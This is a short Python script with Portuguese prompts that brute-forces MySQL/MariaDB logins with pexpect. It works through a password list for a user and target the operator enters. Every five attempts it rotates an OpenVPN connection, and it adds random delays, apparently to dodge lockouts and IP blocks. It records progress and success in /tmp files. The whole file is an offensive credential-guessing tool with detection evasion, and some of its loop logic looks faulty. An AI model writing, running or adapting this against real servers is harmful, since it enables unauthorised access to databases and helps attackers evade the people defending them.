import pexpect
import random
import passwords
import time
import sys
import vpn

passwords = passwords.passwords_
openvpn_enter = vpn.openvpn_enter_()

finded = False

i = 0

i = int(input("Qual o valor inicial: "))

user = input("Qual o usuário: ")
destino = input("Qual o destino: ")

while i < len(passwords):

    with open("/tmp/mysql_i", "w") as f:
        f.write(str(i))

    process = pexpect.spawn("mysql", ["-u", user, "-p", destino], encoding="utf-8")

    process.expect("Enter password:")
    process.sendline(str(passwords[i]))

    result = process.expect(["MariaDB", "mysql", "ERROR 1698", pexpect.EOF])

    if result == 0 or result == 1:
        password = passwords[i]
        print(password)

        finded = True

        with open("/tmp/mysql_finded", "w") as f:
            f.write("True")

        break

    if i % 5 == 0:
        openvpn_enter.close()
        openvpn_enter = vpn.openvpn_enter_()

    if i % random.randint(30, 45):
        time.sleep(random.randint(30, 180))

    process.interact()

    delay = random.randint(1, 15)
    time.sleep(delay)

    i += 1

openvpn_enter.close()